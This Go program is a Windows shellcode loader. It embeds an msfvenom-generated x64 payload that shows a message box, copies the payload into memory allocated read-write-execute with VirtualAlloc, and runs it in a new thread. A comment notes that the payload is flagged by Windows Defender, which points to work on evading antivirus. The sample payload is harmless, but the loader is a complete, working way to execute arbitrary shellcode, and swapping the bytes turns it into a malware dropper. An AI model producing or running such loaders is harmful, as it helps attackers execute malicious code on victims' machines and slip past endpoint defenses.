package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func main() {
	shellcode := []byte{
		//alertbox shellcode (MSFVenom generated, flagged by windef !!!!!!)
		0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
		0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48,
		0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
		0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
		0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0,
		0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e,
		0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
		0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9,
		0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
		0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48,
		0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
		0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41,
		0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d,
		0x3e, 0x48, 0x8d, 0x8d, 0x27, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x49,
		0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
		0x85, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48,
		0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x73, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f,
		0x64, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78,
		0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x00, 0x68, 0x41, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x80, 0x41, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8e, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9e, 0x41, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4b, 0x45, 0x52, 0x4e,
		0x45, 0x4c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x00,
	}

	// Windows API functions
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	// Allocate memory (using VirtualAlloc) - executable, writable, and readable memory
	addr, _, err := virtualAlloc.Call(
		0, 
		uintptr(len(shellcode)), 
		windows.MEM_COMMIT|windows.MEM_RESERVE, 
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}
	fmt.Printf("Memory allocated at: %v\n", addr)

	// Copy the shellcode into the allocated memory
	_, _, err = rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != syscall.Errno(0) {
		fmt.Printf("RtlMoveMemory failed: %v\n", err)
		return
	}

	// Create a new thread to execute the shellcode
	threadHandle, _, err := createThread.Call(
		0, 0, addr, 0, 0, 0, 
	)
	if threadHandle == 0 {
		fmt.Printf("CreateThread failed: %v\n", err)
		return
	}
	fmt.Printf("Shellcode thread created successfully with handle: %v\n", threadHandle)

	// Wait for the shellcode thread to finish
	ret, _, err := waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
	if ret == 0xFFFFFFFF {
		fmt.Printf("WaitForSingleObject failed: %v\n", err)
		return
	}

	fmt.Println("Shellcode executed and thread completed successfully.")
}

